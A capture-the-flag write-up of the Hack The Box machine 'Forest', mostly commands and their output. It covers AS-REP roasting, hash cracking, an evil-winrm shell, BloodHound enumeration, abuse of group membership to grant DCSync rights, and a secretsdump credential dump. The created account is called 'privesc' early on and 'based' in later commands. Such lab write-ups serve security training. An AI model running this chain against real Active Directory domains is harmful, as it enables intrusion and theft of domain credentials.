nmap scan

```
sudo nmap -sV -sC 10.10.10.161
PORT     STATE SERVICE      VERSION                                                            
53/tcp   open  domain?                                                                         
| fingerprint-strings:      
|   DNSVersionBindReqTCP:                                                                      
|     version
|_    bind          
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-12-16 14:37:14Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn                    
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped 
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=12/16%Time=5FDA1A03%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03"); 
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m49s, deviation: 4h37m10s, median: 6m48s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2020-12-16T06:39:40-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-12-16T14:39:40
|_  start_date: 2020-12-16T14:19:25
```

### Enumerating DNS

```
dig axfr @10.10.10.161

; <<>> DiG 9.16.1-Ubuntu <<>> axfr @10.10.10.161
; (1 server found)
;; global options: +cmd
;; connection timed out; no servers could be reached
```

Anything in the zone transfer

```
nslookup
> SERVER 10.10.10.161
Default server: 10.10.10.161
Address: 10.10.10.161#53
> 127.0.0.1
1.0.0.127.in-addr.arpa  name = localhost.
> 10.10.10.161
```

And nslookup doesn't give us anything

### Enumerating SMB

```
smbclient -L 10.10.10.161
Enter WORKGROUP\localuser's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

We can't see anything without password

### Enumerating RPC

```
rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

We have a list of users

### AS-REP Roasting with the list of usernames

```
for user in $(cat user-list.txt);do sudo python3 /opt/impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb.local/${user};done
----
----
[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:89d34a19169eafd23f16817ca1268425$85573ace3bab499c8d199d317675de453acf5e1435da8c722842237e13e481d21bc3479795a134e335c20da48348542d6959875c853aca2557b9b34fc7dd6e0ac3e3f03f0087e3411866f02b2cf7ba29978cab6fba121bdd3c9a4bd8cccf47ad3e22f8abe228652443c418f942abf8fb217c173a95324fb667bc87090a3e034b4504af4f191cdd472e5f426309c0fa5a2159c56d8dba86882f9c4349196432ad6d70656bd8d92d7203f38479033319710eb79d44137835386479c1a0f978be4e2240b0def8c5865b675f05b03e8d35776bb5b71f1be5fbf42be82694b65b4f54e8d152b65066
---
---
```

We have the hash of the user svc-alfresco, I'll crack it using windows

```
.\hashcat.exe -m 18200 .\hash.txt .\rockyou.txt
```

And the cracked password is: `s3rvice`

### Connecting with evil-winrm as user svc-alfresco and enumerating the system with Bloodhound

Using evil-winrm we can get a shell

```
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

The next that we are going to do is use Bloodhound to enumerate privesc vectors, first upload sharphound

```
upload SharpHound.exe
```

Next run it with `-c all`

```
.\SharpHound.exe -c all
```

Download the `.zip` and use it on bloodhound

```
download 20201216071619_BloodHound.zip
```

Then I select the user `SVC-ALFRESCO@HTB.LOCAL` and rigth click and mark as owned, then from analysis I select *Shortest Path from Owned Principals*:

![image1](/assets/images/htb-forest/forest1.png)

### Creating a user adding it to the Exchange Windows Permissions group and adding to him DCSync rights

What we are going to do is create a user because we are member of the Account Operators group

```
net user privesc SecurePassword /add /domain
```

Next things we are going to do is add this user to the Exchange Windows Permissions group:

```
net group "Exchange Windows Permissions" /add privesc
```

And we are member:

```
net group "Exchange Windows Permissions"
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
privesc
The command completed successfully.
```

Now we have the permissions to modify DACL on the domain `HTB.LOCAL`, we are going to do what bloodhound says when we click on help:

![image2](/assets/images/htb-forest/forest2.png)

For this we need powerview, let's upload it to the box:

```
upload PowerView.ps1
Import-Module .\PowerView.ps1
```

We add the DCSync rights

```
Add-DomainObjectAcl -PrincipalIdentity based -TargetIdentity "DC=htb,DC=local" -Rights DCSync
```

### Dumping hashes

Now with `secretsdump.py` we can get the administrator hash

```
python3 secretsdump.py 'htb.local/based:SecurePassword@10.10.10.161'
```

Using the administrator hash you can login with evil-winrm
